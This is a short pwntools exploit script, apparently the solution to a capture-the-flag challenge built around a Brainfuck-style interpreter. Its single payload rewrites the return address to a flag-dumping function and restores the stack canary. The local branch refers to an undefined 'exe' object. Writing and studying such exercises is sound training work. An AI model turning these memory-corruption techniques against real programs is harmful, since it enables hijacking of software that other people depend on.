#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

# shortcuts
def sla(delim,line): return p.sendlineafter(delim,line)

host, port = "ctfi.ng", "31415"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process(exe.path)

# extend memory_size, search for next byte at 0xff.. advance to return address, transform return address to mmio_dump_flag,  go backwards and restore canary
payload = b'<<<<<<<+[>+]>>>>'+b'+'*49+b'<<<<<<<<<-<-<-<-<-<-<-<-'
print(f'payload length = {len(payload)}')
sla(b'code:\n', payload)

p.interactive()

